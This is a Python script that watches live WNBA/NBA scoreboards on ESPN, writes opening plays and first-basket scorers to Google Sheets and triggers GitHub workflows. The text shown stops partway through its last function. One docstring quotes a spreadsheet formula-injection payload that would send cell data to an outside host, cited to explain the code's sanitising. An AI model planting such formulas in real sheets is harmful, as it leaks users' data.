"""
FIRST BASKET TRACKER -- LIVE PLAY BY PLAY (opening plays, real-time)
----------------------------------------------------------------------------
One league per run: the WNBA by default, the NBA with FIRSTIQ_LEAGUE=nba.
Everything that differs between them (sheet, ESPN feed, teams, post-tip
window) is in leagues.py; the file name is historical. live-playbyplay.yml
runs both leagues each cycle, one after the other, through
wnba_playbyplay_cycle.py.

The main pipeline (a separate, private repo) only captures a game's
opening plays once it's logged the ENTIRE game as final -- that can be
1-2+ hours after the first basket itself actually happened.

This script closes that gap: it checks TODAY's scoreboard directly (no
dependency on any other tab or script), and for any game currently in
progress or just finished, fetches and upserts its opening plays into the
'Play By Play' tab right away. Runs on a schedule via live-playbyplay.yml
in this same repo.

Captures every play up through the point where BOTH teams have logged
their own first scoring play -- not a fixed early-game time window. A
fixed window (this used to stop at the first 4 minutes of Q1) silently
drops the "First Team Basket" market whenever the slower-scoring team
doesn't get on the board that early, which happens often enough to
matter. There's no reliable time bound for "how long until both teams
have scored," so this just keeps capturing until it actually happens --
but never past the end of period 1 (hard stop, 2026-11-15). Plays are put
in game order first (ESPN's array is in entry order), a score is counted
the app's way (flagged, at least 1 point, one of the two teams), and a
feed that contradicts itself is not written. A capture left incomplete is
repaired the next morning by bball-bots' wnba_playbyplay_tab.py.

Safe to re-run: upserts (replaces) rows for any event ID it touches, never
appends duplicates. Skips games it has already fully captured (an
existing row already proves both teams have a logged scoring play) to
keep repeat runs cheap -- including already-final games, since a game
being over doesn't mean a *previous* run captured both teams before this
fix landed.

Lives in its own public repo (separate from the actual picks/scoring
pipeline) specifically so it can poll frequently without any GitHub
Actions minutes budget concern -- public repos get unlimited minutes on
standard runners, private repos are capped. This script contains no
prediction/scoring logic, just a live ESPN scoreboard watcher, so keeping
it public costs nothing competitively.

Also double-duties as the trigger for an extra, one-off run of the main
pipeline's intraday-updates workflow a few minutes into a game's Q1 --
that workflow otherwise only runs on a fixed 2-hour clock, which can leave
picks/injury status stale for up to ~2 hours right after a game actually
tips off. Requires a MAIN_PIPELINE_DISPATCH_TOKEN secret (a GitHub token
with permission to dispatch workflows on the private pipeline repo); if
that secret isn't set, this feature just quietly no-ops.

DRY RUN: with FIRSTIQ_DRY_RUN set (or --dry-run), a poll reads the sheet
and ESPN exactly as usual, prints every row it would write and every
dispatch it would send, and writes and dispatches nothing. See
dry_run_enabled().
"""

import os
import sys
import time
import traceback
from datetime import datetime
from zoneinfo import ZoneInfo

import gspread
import leagues
import sheets as sheets_client
from curl_cffi import requests
from google.oauth2.service_account import Credentials
from tenacity import (
    retry,
    retry_if_exception,
    stop_after_attempt,
    wait_exponential_jitter,
)

CREDENTIALS_PATH = os.environ.get("GOOGLE_CREDENTIALS_PATH", "gcreds.json")
PBP_SHEET_NAME = "Play By Play"
LOCAL_TZ = ZoneInfo("America/New_York")

# Which league this process works on: its sheet, its ESPN feed, its real
# teams and their codes, its post-tip window. Resolved once, here, from
# FIRSTIQ_LEAGUE; an unknown value raises and the run stops. See leagues.py.
LEAGUE = leagues.resolve()

WRITE_SCOPES = ["https://www.googleapis.com/auth/spreadsheets", "https://www.googleapis.com/auth/drive"]
# A dry run asks Google for a token that cannot write at all.
READ_ONLY_SCOPES = ["https://www.googleapis.com/auth/spreadsheets.readonly",
                    "https://www.googleapis.com/auth/drive.readonly"]

# How a typed cell has to start for Sheets to run it as a formula. See
# typed_as_text().
FORMULA_STARTS = ("=", "+", "-", "@")

DRY_RUN_ENV_VAR = "FIRSTIQ_DRY_RUN"
_DRY_RUN_OFF = {"", "0", "false", "no", "off"}

PBP_HEADER = ["Event ID", "Date", "Matchup", "Period", "Clock", "Seconds Remaining", "Team",
              "Away Score", "Home Score", "Play", "Scoring Play (Y/N)"]
# Rows added whenever the Play By Play tab has to be grown, so it is not
# grown again every night. The same headroom bball-bots' own play-by-play
# step uses (SCRIPTS/wnba_playbyplay_tab.py).
PBP_GRID_HEADROOM_ROWS = 5000

FB_SHEET_NAME = "Live First Basket"
FB_HEADER = ["Event ID", "Date", "Matchup", "Player", "Athlete ID", "Team", "Position",
             "Method", "Period", "Clock", "Captured At"]

# The main pipeline's intraday refresh (injuries/picks/odds) otherwise only
# runs on a fixed 2-hour clock, which can leave picks stale for up to ~2
# hours right after a game actually tips off -- exactly when an OUT/GTD
# player's status is most likely to have just changed. This repo already
# polls every 5 minutes during game windows, so it double-duties as the
# trigger: once a game is a few minutes into Q1, fire an extra one-off
# intraday run via the GitHub API instead of waiting for the clock.
MAIN_PIPELINE_REPO = "FirstIQ/bball-bots"
MAIN_PIPELINE_INTRADAY_WORKFLOW = "intraday-updates.yml"
MAIN_PIPELINE_BRANCH = "master"
DISPATCH_LOG_SHEET_NAME = "Post-Tip Dispatch Log"
DISPATCH_LOG_HEADER = ["Event ID", "Date", "Matchup", "Dispatched At"]

# Second dispatch, fired at a different moment and for a different
# reason: once BOTH teams have logged their own first scoring play, the
# first basket and both first-team-baskets are decided, so the picks
# riding on them can be graded immediately instead of sitting Pending
# until the 8am pipeline builds Game Log. Kept in its own log tab so the
# two dispatches dedupe independently -- a game fires each exactly once.
MAIN_PIPELINE_GRADING_WORKFLOW = "live-grading.yml"
GRADING_DISPATCH_LOG_SHEET_NAME = "Live Grading Dispatch Log"

# Simple in-run cache -- same athlete can be the first-basket scorer looked
# up at most once per run anyway, but avoids re-hitting ESPN if it ever is.
# Keyed by league as well: ESPN numbers each league's athletes separately.
_athlete_cache = {}


def dry_run_enabled(argv=None):
    """True when this run must write nothing and dispatch nothing.

    On with --dry-run, or with FIRSTIQ_DRY_RUN set to anything that is not
    plainly "off". An unreadable value counts as ON: a misread switch has
    to fail toward not writing to the production sheet."""
    if "--dry-run" in (sys.argv[1:] if argv is None else argv):
        return True
    return os.environ.get(DRY_RUN_ENV_VAR, "").strip().lower() not in _DRY_RUN_OFF


def _is_retryable(exc):
    """5xx, timeouts, and connection errors only -- never 4xx (won't fix
    itself on retry)."""
    if isinstance(exc, (requests.exceptions.ConnectionError, requests.exceptions.Timeout)):
        return True
    if isinstance(exc, requests.exceptions.HTTPError):
        resp = getattr(exc, "response", None)
        return resp is not None and resp.status_code >= 500
    return False


@retry(
    stop=stop_after_attempt(3),
    wait=wait_exponential_jitter(initial=2, max=8),
    retry=retry_if_exception(_is_retryable),
    reraise=True,
)
def _get(url, **kwargs):
    """Same retry policy as the main pipeline's ESPNSource (firstiq/sources/
    espn.py) -- 3 attempts, ~2s/4s/8s exponential backoff, only on 5xx/
    timeout/connection errors. This repo intentionally stays independent of
    firstiq (no shared import, see module docstring), so the policy is
    duplicated here rather than shared."""
    resp = requests.get(url, impersonate="chrome", timeout=15, **kwargs)
    resp.raise_for_status()
    return resp


def get_player(athlete_id):
    """Resolves an athlete ID to name/position via ESPN's athlete endpoint --
    same source and shape the main pipeline's own lookup uses, kept
    independent here since this repo is intentionally self-contained."""
    cache_key = (LEAGUE.key, athlete_id)
    if cache_key in _athlete_cache:
        return _athlete_cache[cache_key]
    try:
        data = _get(LEAGUE.athlete_url(athlete_id)).json()
        name = data.get("fullName") or data.get("displayName") or "UNKNOWN"
        pos = data.get("position", {}).get("abbreviation", "")
        result = {"name": name, "position": pos[0] if pos else ""}
    except Exception:
        # Don't cache a transient lookup failure as a resolved "UNKNOWN"
        # athlete -- that would permanently poison this event's first-basket
        # record for the rest of the run. Return None so the caller retries
        # the whole event on the next poll instead.
        return None
    _athlete_cache[cache_key] = result
    return result


def get_abbr(full_name, espn_fallback):
    return LEAGUE.team_abbr.get(full_name, espn_fallback)


def parse_clock_to_seconds(display_value):
    """'9:47' -> 587; '45.3' -> 45 (ESPN's last-minute format, which used
    to come back None and drop the period's final minute)."""
    try:
        if ":" not in display_value:
            whole, tenths = display_value.split(".")
            return int(whole) if tenths.isdigit() else None
        minutes, seconds = display_value.split(":")
        return int(minutes) * 60 + int(seconds)
    except (ValueError, AttributeError, TypeError):
        return None


def _int_or_none(value):
    try:
        return int(value)
    except (TypeError, ValueError):
        return None


def in_game_order(plays):
    """Period 1 plays with a readable clock, in GAME order: period, clock
    running down, then ESPN's sequenceNumber. ESPN's array is in entry
    order, which is not game order (BKN @ CLE, 2026-10-24: free throws at
    11:16 were entered after a three at 10:51). Same key as the app's
    basketball orderKey and bball-bots' wnba_playbyplay_tab.py.

    Period 1 only: the opening is never read past it (hard stop, decided
    2026-11-15)."""
    keyed = []
    for i, play in enumerate(plays):
        if play.get("period", {}).get("number") != 1:
            continue
        seconds = parse_clock_to_seconds(play.get("clock", {}).get("displayValue", ""))
        if seconds is None:
            continue
        sequence = _int_or_none(play.get("sequenceNumber"))
        keyed.append(((-seconds, sequence if sequence is not None else i, i), play))
    return [play for _, play in sorted(keyed, key=lambda kp: kp[0])]


def counts_as_score(play, team_ids):
    """The app's rule: flagged scoring, worth at least 1 point, by one of
    the game's two teams."""
    return (play.get("scoringPlay", False) is True
            and (_int_or_none(play.get("scoreValue")) or 0) >= 1
            and play.get("team", {}).get("id") in team_ids)


def reaches_past_period_1(plays):
    return any((play.get("period", {}).get("number") or 0) > 1 for play in plays)


def event_already_captured(rows_for_event):
    """True if the already-captured rows for this event show both teams
    have logged their own first scoring play -- meaning there's nothing
    more to gain by re-fetching, since fetch_game_data() stops right after
    that point. Deliberately does NOT special-case a "post"/final game:
    a game being over doesn't mean a previous run under the old fixed-
    window logic actually captured both teams."""
    scoring_teams = {row[6] for row in rows_for_event if len(row) > 10 and row[10] == "Y"}
    return len(scoring_teams) >= 2


def current_period_and_clock(event):
    """Reads (period, seconds_remaining) straight off the scoreboard's own
    status block for this event -- no extra API call needed."""
    status = event.get("status", {})
    period = status.get("period")
    seconds_remaining = parse_clock_to_seconds(status.get("displayClock", ""))
    return period, seconds_remaining


def is_a_few_minutes_into_first_quarter(event):
    """Inside the league's post-tip window: three to nine minutes into Q1,
    wide enough to be caught by a 5-minute poll. The window is in seconds
    LEFT on the clock, so it differs by quarter length (leagues.py)."""
    period, seconds_remaining = current_period_and_clock(event)
    if period != 1 or seconds_remaining is None:
        return False
    low, high = LEAGUE.post_tip_window
    return low <= seconds_remaining <= high


def trigger_main_pipeline_workflow(token, workflow):
    """Fires a workflow_dispatch on one of the main (private) pipeline
    repo's workflows. Returns True on success; never raises, so a
    dispatch failure never takes down this run's actual play-by-play work.

    Both of the pipeline's workflows run every league, so the same dispatch
    serves whichever league this run is watching."""
    if dry_run_enabled():
        # main() never gets here in a dry run. This is the second lock.
        print(f"    DRY RUN: not dispatching {workflow}.")
        return False
    url = f"https://api.github.com/repos/{MAIN_PIPELINE_REPO}/actions/workflows/{workflow}/dispatches"
    try:
        resp = requests.post(
            url,
            json={"ref": MAIN_PIPELINE_BRANCH},
            headers={
                "Authorization": f"Bearer {token}",
                "Accept": "application/vnd.github+json",
            },
            impersonate="chrome",
            timeout=15,
        )
        return resp.status_code == 204
    except Exception as e:
        print(f"    Could not trigger main pipeline workflow {workflow}: {e}")
        return False


def get_todays_events(league=None):
    """Today's scoreboard for `league` (default: this run's league). The
    gate and the self-chain pass a league to look at each one in turn."""
    # datetime.now() is naive and reads UTC on GitHub Actions runners --
    # between 8pm-midnight ET, UTC has already rolled to the next calendar
    # date, which would silently pull tomorrow's slate instead of today's.
    target_str = datetime.now(LOCAL_TZ).strftime("%Y%m%d")
    return _get((league or LEAGUE).scoreboard_url(target_str)).json().get("events", [])


def format_shot_method(type_text, points):
    """Turns ESPN's verbose shot-type text (e.g. "Pullup Jump Shot",
    "Driving Layup Shot") plus the point value into a short label like
    "3-Pointer" or "Layup", matching the plain "layup, 3pt, etc." vocab
    the tracker/notification should show instead of ESPN's raw wording."""
    t = (type_text or "").lower()
    if "dunk" in t:
        base = "Dunk"
    elif "layup" in t:
        base = "Layup"
    elif "hook" in t:
        base = "Hook Shot"
    elif "tip" in t:
        base = "Tip-In"
    else:
        base = "Jump Shot"
    if points == 3:
        return "3-Pointer" if base == "Jump Shot" else f"3PT {base}"
    return base


def find_first_basket(plays, team_id_to_name):
    """The game's first score in period 1, in game order, by the app's
    rule (see counts_as_score). Period 1 only: on 401857190 a broken live
    feed showed every period 1 shot missed, and this recorded a period 3
    layup as the first basket -- a row that is written once and never
    revisited."""
    for play in in_game_order(plays):
        if not counts_as_score(play, team_id_to_name):
            continue
        participants = play.get("participants", [])
        athlete_id = participants[0]["athlete"]["id"] if participants else None
        if not athlete_id:
            continue
        player = get_player(athlete_id)
        if player is None:
            return None  # unresolved lookup -- retry this event on the next poll
        team_id = play.get("team", {}).get("id", "")
        points = play.get("scoreValue") or play.get("pointsAttempted")
        return {
            "name": player["name"],
            "athlete_id": athlete_id,
            "position": player["position"],
            "team": team_id_to_name.get(team_id, team_id or ""),
            "method": format_shot_method(play.get("type", {}).get("text", ""), points),
            "period": play.get("period", {}).get("number"),
            "clock": play.get("clock", {}).get("displayValue", ""),
        }
    return None


class UntrustedFeed(Exception):
    """The feed contradicts itself. Nothing is written for the game this
    poll; the next poll tries again."""


def fetch_game_data(event_id):
    """Returns (rows, fully_captured, first_basket) from a single fetch.
    rows covers every play up through the point where both teams have
    logged their own first scoring play (fully_captured=True at that
    point) -- see the module docstring for why this isn't a fixed time
    window. first_basket is the resolved scorer of the game's actual first
    basket (see find_first_basket), independent of that per-team cutoff."""
    data = _get(LEAGUE.summary_url(event_id)).json()
    if "plays" not in data:
        raise ValueError(f"Event {event_id}: summary response has no 'plays' key -- ESPN response shape may have changed.")
    plays = data["plays"]
    competitors = data["header"]["competitions"][0]["competitors"]
    team_id_to_name = {c["team"]["id"]: c["team"]["displayName"] for c in competitors}
    side_ids = {c["homeAway"]: c["team"]["id"] for c in competitors}

    first_basket = find_first_basket(plays, team_id_to_name)

    rows = []
    teams_scored = set()
    fully_captured = False
    max_score = {"away": 0, "home": 0}
    for play in in_game_order(plays):
        period = play.get("period", {}).get("number")
        clock_display = play.get("clock", {}).get("displayValue", "")
        seconds_remaining = parse_clock_to_seconds(clock_display)
        team_id = play.get("team", {}).get("id", "")
        if (play.get("scoringPlay", False) is True and (_int_or_none(play.get("scoreValue")) or 0) >= 1
                and team_id and team_id not in team_id_to_name):
            raise UntrustedFeed(f"scoring play by team {team_id!r}, not one of this game's two teams")
        team_name = team_id_to_name.get(team_id, team_id or "")
        away_score = play.get("awayScore", "")
        home_score = play.get("homeScore", "")
        text = play.get("text", "")
        is_score = counts_as_score(play, team_id_to_name)
        rows.append((period, clock_display, seconds_remaining, team_name, away_score, home_score, text, "Y" if is_score else "N"))
        max_score["away"] = max(max_score["away"], _int_or_none(away_score) or 0)
        max_score["home"] = max(max_score["home"], _int_or_none(home_score) or 0)
        if is_score:
            teams_scored.add(team_id)
        if len(teams_scored) >= 2:
            fully_captured = True
            break

    # The running score must be explained by the saved scoring plays.
    for side in ("away", "home"):
        if max_score[side] > 0 and side_ids[side] not in teams_scored:
            raise UntrustedFeed(f"running score shows the {side} team with {max_score[side]} point(s) "
                                f"but no saved play is its score")

    # Period 1 is over with only one team on the board: that team's
    # opponent truly first scores later, and the capture is done. With
    # NEITHER team on the board it is not done -- no real game goes a
    # period without a score; a broken feed does -- so it is re-fetched.
    if not fully_captured and teams_scored and reaches_past_period_1(plays):
        fully_captured = True
    return rows, fully_captured, first_basket


def get_or_create_tab(spreadsheet, sheet_name, header, dry_run=False):
    """The tab, created with its header if it is missing. A dry run creates
    nothing: it says so and returns None, which reads as an empty tab."""
    try:
        return spreadsheet.worksheet(sheet_name)
    except gspread.WorksheetNotFound:
        if dry_run:
            print(f"DRY RUN: would create the '{sheet_name}' tab, which doesn't exist yet.")
            return None
        print(f"'{sheet_name}' tab doesn't exist yet -- creating it.")
        ws = spreadsheet.add_worksheet(title=sheet_name, rows=2000, cols=len(header))
        # Keyword form: gspread has swapped this argument order once
        # already and accepts the old one only through a shim that
        # detects (str, list). Positional is a bet on which major
        # version is installed at run time.
        ws.update(range_name="A1", values=[header], value_input_option="USER_ENTERED")
        return ws


def typed_as_text(rows):
    """Rows for a USER_ENTERED append, with nothing in them Sheets can run.

    USER_ENTERED makes Sheets read each value as if it were typed into the
    cell, so a string that starts with = + - or @ becomes a formula. The
    names, IDs, shot method and clock in these rows come from ESPN's API:
    an athlete named =IMPORTDATA("https://example.com/?"&A1) would have
    run in the production sheet.

    An apostrophe in front tells Sheets "this is text". Sheets does not
    show it, so every reader still gets the value ESPN sent. Leading
    whitespace is skipped before the check, to be safe. Every other value
    passes through, which is why this is not a switch to RAW: RAW would
    store today's dates, numbers and clocks as text and could change what
    the app and the grader read."""
    return [["'" + cell if isinstance(cell, str) and cell.lstrip().startswith(FORMULA_STARTS) else cell
             for cell in row] for row in rows]


def data_rows(ws):
    """Every row under the header. An empty tab, or one a dry run did not
    create, has none."""
    return ws.get_all_values()[1:] if ws is not None else []


def report_edit_access(client, spreadsheet_id):
    """Dry run only: asks Drive whether this service account could have
    written to the sheet, so a missing Editor share shows up here and not
    as a failed first write on a game night. One read; changes nothing."""
    try:
        response = client.http_client.request(
            "get", f"https://www.googleapis.com/drive/v3/files/{spreadsheet_id}",
            params={"fields": "capabilities(canEdit)", "supportsAllDrives": "true"})
        can_edit = response.json()["capabilities"]["canEdit"]
    except Exception as e:
        # The reason is the error's type and HTTP status, never its text:
        # this repo's Actions logs are public, and Drive's messages name the
        # file and the Google Cloud project.
        status = sheets_client._status_code(e)
        reason = type(e).__name__ + (f", HTTP {status}" if status else "")
        hint = " -- 403 usually means the Drive API is not enabled for the service account's project" \
            if status == 403 else ""
        print(f"DRY RUN: the service account can edit this sheet: unknown ({reason}){hint}")
        return
    # Drive's answer is about the account, not about this run's read-only
    # token -- but that is Google's documented behaviour, not something this
    # repo has seen fail, so the line says whose answer it is.
    if can_edit:
        print("DRY RUN: the service account can edit this sheet: yes (as Drive reports it)")
    else:
        print("DRY RUN: the service account can edit this sheet: NO (as Drive reports it) -- a real run "
              "would fail on its first write. Share the sheet with the service account as Editor.")


def main():
    league = LEAGUE
    dry_run = dry_run_enabled()
    problem = leagues.sheet_problem(league)
    if problem:
        raise SystemExit(f"{league.name}: {problem} -- stopping before anything is fetched "
                         f"or opened. See leagues.py.")
    print(f"=== {league.name} live play by play ===")
    if dry_run:
        print("DRY RUN: reading as usual; nothing will be written and nothing dispatched.")

    creds = Credentials.from_service_account_file(
        CREDENTIALS_PATH, scopes=READ_ONLY_SCOPES if dry_run else WRITE_SCOPES)
    # sheets_client.authorize(), not gspread.authorize(): this script is
    # the heaviest Sheets consumer in the system (a poll every 5 minutes,
    # four full-tab reads and a whole-tab rewrite each time) and shares one
    # service account -- and therefore one per-minute quota -- with the main
    # pipeline. Bare gspread turns a 429 into a dead run. See sheets.py.
    # In a dry run the client also refuses to send anything but a read.
    client = sheets_client.authorize(creds, read_only=dry_run)
    spreadsheet = client.open_by_key(league.spreadsheet_id)
    if dry_run:
        report_edit_access(client, league.spreadsheet_id)

    print("Checking today's scoreboard for live/finished games...")
    events = get_todays_events()

    pbp_ws = get_or_create_tab(spreadsheet, PBP_SHEET_NAME, PBP_HEADER, dry_run)
    existing_rows = data_rows(pbp_ws)

    fb_ws = get_or_create_tab(spreadsheet, FB_SHEET_NAME, FB_HEADER, dry_run)
    fb_known_event_ids = {r[0] for r in data_rows(fb_ws) if r}

    dispatch_token = os.environ.get("MAIN_PIPELINE_DISPATCH_TOKEN")
    # A dry run reports the dispatches a real run would send IF it has the
    # token, whether or not the dry run was handed it (the workflow's
    # dry-run step is not). A real run without the token sends none.
    can_dispatch = bool(dispatch_token) or dry_run
    dispatch_ws = get_or_create_tab(spreadsheet, DISPATCH_LOG_SHEET_NAME, DISPATCH_LOG_HEADER, dry_run)
    dispatched_event_ids = {r[0] for r in data_rows(dispatch_ws) if r}

    grading_dispatch_ws = get_or_create_tab(spreadsheet, GRADING_DISPATCH_LOG_SHEET_NAME, DISPATCH_LOG_HEADER, dry_run)
    grading_dispatched_event_ids = {r[0] for r in data_rows(grading_dispatch_ws) if r}

    updates = {}  # event_id -> new_rows, only for events actually re-fetched
    fb_new_rows = []  # newly-identified first baskets this run
    grade_ready = []  # events whose opening just became fully decided
    today_str = datetime.now(LOCAL_TZ).strftime("%Y-%m-%d")
    now_str = datetime.now(LOCAL_TZ).strftime("%Y-%m-%d %H:%M:%S")

    # Today's real games that have tipped off, in scoreboard order.
    games = []
    for event in events:
        state = event["status"]["type"]["state"]
        if state == "pre":
            continue  # hasn't tipped off yet, nothing to fetch

        season_slug = event.get("season", {}).get("slug", "unknown")
        if season_slug != "regular-season":
            continue

        competitors = event["competitions"][0]["competitors"]
        team_names = {c["team"]["displayName"] for c in competitors}
        if not team_names.issubset(league.real_teams):
            continue

        home_c = next(c for c in competitors if c["homeAway"] == "home")["team"]
        away_c = next(c for c in competitors if c["homeAway"] == "away")["team"]
        home = get_abbr(home_c["displayName"], home_c.get("abbreviation", ""))
        away = get_abbr(away_c["displayName"], away_c.get("abbreviation", ""))
        games.append((event, event["id"], f"{away} @ {home}", state))

    # The post-tip refresh: ONE dispatch per poll, covering every game that
    # is a few minutes into Q1 and has not had one. It used to be one per
    # game. The pipeline's intraday workflow refreshes the whole league (and
    # spends odds credits) whichever game asked, and has no concurrency
    # group -- so five NBA games tipping at 7:00 started five identical runs
    # within seconds, racing on the same tabs.
    post_tip = [(event_id, matchup) for event, event_id, matchup, _ in games
                if can_dispatch and event_id not in dispatched_event_ids
                and is_a_few_minutes_into_first_quarter(event)]
    if post_tip:
        names = ", ".join(m for _, m in post_tip)
        post_tip_rows = [[event_id, today_str, matchup, now_str] for event_id, matchup in post_tip]
        if dry_run:
            print(f"  DRY RUN: {names}: a few minutes into Q1 -- would dispatch "
                  f"{MAIN_PIPELINE_INTRADAY_WORKFLOW} once and log {len(post_tip_rows)} row(s) "
                  f"to '{DISPATCH_LOG_SHEET_NAME}':")
            for row in post_tip_rows:
                print(f"    {row}")
        else:
            print(f"  {names}: a few minutes into Q1 -- triggering an early intraday pipeline refresh...")
            if trigger_main_pipeline_workflow(dispatch_token, MAIN_PIPELINE_INTRADAY_WORKFLOW):
                # Log immediately, before doing anything else that could fail --
                # otherwise a later exception this run leaves the dispatch fired
                # but unrecorded, and the next run fires it again.
                dispatch_ws.append_rows(typed_as_text(post_tip_rows), value_input_option="USER_ENTERED")
                dispatched_event_ids.update(event_id for event_id, _ in post_tip)
                print("    Triggered and logged.")
            else:
                print("    Dispatch failed -- will retry next run.")

    for event, event_id, matchup, state in games:
        rows_for_event = [r for r in existing_rows if r and r[0] == event_id]
        if rows_for_event and event_already_captured(rows_for_event):
            # Nothing left to fetch for this game -- but if its grading
            # dispatch never went out (it failed, or this game was
            # captured before live grading existed), fire it now. The
            # plays are already on the sheet, so the grader has what it
            # needs immediately.
            if can_dispatch and event_id not in grading_dispatched_event_ids:
                grade_ready.append((event_id, matchup))
            continue

        print(f"  Fetching {matchup} (event {event_id}, status: {state})...")
        try:
            plays, fully_captured, first_basket = fetch_game_data(event_id)
        except UntrustedFeed as e:
            print(f"    Feed rejected, will retry next poll: {e}")
            continue
        except Exception as e:
            print(f"    Could not fetch: {e}")
            continue

        if first_basket and event_id not in fb_known_event_ids:
            fb_new_rows.append([event_id, today_str, matchup, first_basket["name"], first_basket["athlete_id"],
                                 first_basket["team"], first_basket["position"], first_basket["method"],
                                 first_basket["period"], first_basket["clock"], now_str])
            fb_known_event_ids.add(event_id)
            print(f"    First basket: {first_basket['name']} ({first_basket['team']}) -- {first_basket['method']}")

        if not plays and not fully_captured:
            print("    Nothing capturable yet -- will retry next run.")
            continue

        new_rows = [[event_id, today_str, matchup, *p] for p in plays]
        updates[event_id] = new_rows
        status_note = "both teams scored, fully captured" if fully_captured else "still waiting on one team, will refine next run"
        print(f"    Captured {len(new_rows)} play(s) -- {status_note}.")

        # Both teams have scored, so FB and both FTs are settled for this
        # game. Queue a grading dispatch -- but don't fire it here: the
        # plays it needs are only written to the sheet at the end of this
        # run, and dispatching first would race the grader against data
        # that isn't there yet.
        if fully_captured and can_dispatch and event_id not in grading_dispatched_event_ids:
            grade_ready.append((event_id, matchup))

    if fb_new_rows and dry_run:
        print(f"DRY RUN: would append {len(fb_new_rows)} row(s) to '{FB_SHEET_NAME}':")
        for row in fb_new_rows:
            print(f"    {row}")
    elif fb_new_rows:
        print(f"Writing Live First Basket: {len(fb_new_rows)} new game(s).")
        fb_ws.append_rows(typed_as_text(fb_new_rows), value_input_option="USER_ENTERED")

    if updates:
        # RE-READ before writing back, and rebuild from the fresh copy.
        #
        # This is a clear()+full-rewrite, so it replaces the entire tab with
        # whatever this run believes it should contain. `existing_rows` was
        # read at the top of main(), before a scoreboard fetch and one ESPN
        # summary fetch per live game -- easily tens of seconds. Anything
        # appended to Play By Play inside that window is absent from the
        # snapshot and would be silently erased by the write-back. The
        # victim gets no error; only the destroying run would know, and it
        # doesn't look.
        #
        # The other writer is a different REPOSITORY: the main pipeline's
        # wnba_playbyplay_tab.py appends historical games as step 7 of its
        # daily run. GitHub concurrency groups are scoped per-repo, so this
        # repo's `live-pbp` group cannot see that job and provides no
        # protection against it. Today's clocks keep them apart (8:17am ET
        # vs. game hours) but nothing enforces that, and a workflow_dispatch
        # answers to no clock at all.
        #
        # Re-reading immediately before the write is what makes the window
        # small enough not to matter, rather than relying on the schedule.
        current_rows = data_rows(pbp_ws)

        appeared = len(current_rows) - len(existing_rows)
        if appeared > 0:
            print(f"  NOTE: {appeared} row(s) appeared in '{PBP_SHEET_NAME}' since this run "
                  f"started -- most likely the main pipeline's own play-by-play step. "
                  f"Merging them in rather than overwriting them.")

        kept_rows = [r for r in current_rows if r and r[0] not in updates]
        all_rows = kept_rows + [row for rows in updates.values() for row in rows]
        counts = (f"{len(all_rows)} data row(s) ({len(kept_rows)} kept, "
                  f"{len(all_rows) - len(kept_rows)} for {len(updates)} updated game(s))")

        # The rewrite names rows 2..n+1. Sheets REFUSES a write past the
        # tab's grid; it does not grow the tab. Without this, the first
        # rewrite to outgrow the grid would clear the tab, fail to refill
        # it, and leave the next poll to take an empty tab as the truth.
        # So the tab is grown BEFORE it is cleared; if growing fails, the
        # run stops with the tab untouched. bball-bots' own step grows the
        # tab the same way, but only when ITS morning append overflows --
        # and once this watcher captures every game live, that step has
        # little left to append.
        rows_needed = len(all_rows) + 1
        grid_rows = pbp_ws.row_count if pbp_ws is not None else 0
        grow_to = rows_needed + PBP_GRID_HEADROOM_ROWS if rows_needed > grid_rows else None

        if dry_run:
            if grow_to:
                print(f"DRY RUN: would first grow '{PBP_SHEET_NAME}' from {grid_rows} to {grow_to} rows "
                      f"(the rewrite needs {rows_needed}).")
            print(f"DRY RUN: would rewrite '{PBP_SHEET_NAME}': {counts}; the tab's grid has "
                  f"{grid_rows} row(s). The new rows:")
            for row in all_rows[len(kept_rows):]:
                print(f"    {row}")
        else:
            if grow_to:
                print(f"  Growing '{PBP_SHEET_NAME}' from {grid_rows} to {grow_to} rows before the rewrite "
                      f"(it needs {rows_needed}).")
                pbp_ws.resize(rows=grow_to)
            print(f"Writing Play By Play: {len(kept_rows)} untouched row(s) kept, {len(updates)} game(s) updated.")
            started = time.monotonic()
            try:
                pbp_ws.clear()
                pbp_ws.update(range_name="A1", values=[PBP_HEADER], value_input_option="USER_ENTERED")
                if all_rows:
                    pbp_ws.update(range_name=f"A2:K{len(all_rows) + 1}", values=all_rows, value_input_option="RAW")
            except Exception:
                # The case the timing line below exists to measure, so it
                # is said here too before the error ends the run.
                print(f"Play By Play rewrite [{league.key}]: FAILED {time.monotonic() - started:.2f}s in, "
                      f"while writing {counts}. The tab may be empty or partial until a poll rewrites it.")
                raise
            refilled = time.monotonic()

            # Assert the rewrite did what it claimed. A clear() that succeeded
            # followed by an update() that partially failed leaves the tab
            # truncated, and every consumer downstream reads that as "these
            # games have no plays" rather than as an error.
            written = len(pbp_ws.get_all_values()) - 1

            # One line per league per rewrite, to measure it: the tab is
            # empty or partial from clear() until the rows land, the app
            # reads it, and the NBA brings about 4x the WNBA's games.
            print(f"Play By Play rewrite [{league.key}]: wrote {counts}; read back {written}; "
                  f"tab empty or partial for {refilled - started:.2f}s, "
                  f"{time.monotonic() - started:.2f}s in all.")
            if written != len(all_rows):
                print(f"  WARNING: expected {len(all_rows)} data row(s) in '{PBP_SHEET_NAME}' "
                      f"after the rewrite, found {written}. The tab may be truncated -- "
                      f"the next poll will rebuild it, but check before trusting live grading.")
    else:
        print("No new plays to write.")

    # Only now that the plays are actually on the sheet is it safe to ask
    # the main pipeline to grade off them. One dispatch covers every game
    # that became decided this run -- the grader scans all pending picks,
    # so firing it once per run is enough no matter how many games landed.
    if grade_ready:
        names = ", ".join(m for _, m in grade_ready)
        grading_rows = [[event_id, today_str, matchup, now_str] for event_id, matchup in grade_ready]
        if dry_run:
            print(f"DRY RUN: opening decided for {names} -- would dispatch {MAIN_PIPELINE_GRADING_WORKFLOW} "
                  f"and log {len(grading_rows)} row(s) to '{GRADING_DISPATCH_LOG_SHEET_NAME}':")
            for row in grading_rows:
                print(f"    {row}")
        else:
            print(f"Opening decided for {names} -- triggering live grading...")
            if trigger_main_pipeline_workflow(dispatch_token, MAIN_PIPELINE_GRADING_WORKFLOW):
                grading_dispatch_ws.append_rows(typed_as_text(grading_rows), value_input_option="USER_ENTERED")
                print("    Triggered and logged.")
            else:
                print("    Grading dispatch failed -- will retry next run "
                      "(the scheduled live-grading run is the backstop).")

    print("Done.")


def run():
    """main(), with every sheet ID kept out of a crash's traceback.

    This repo's Actions logs are public. A Sheets error names the request's
    URL, and the URL holds the sheet ID. An ID that came from a secret is
    masked by GitHub only when it is printed exactly as stored; this does
    not depend on that. The exit code is 1, as an uncaught error's always was."""
    try:
        main()
    except Exception:
        text = traceback.format_exc()
        for league in (LEAGUE, *leagues.ALL):
            if league.spreadsheet_id:
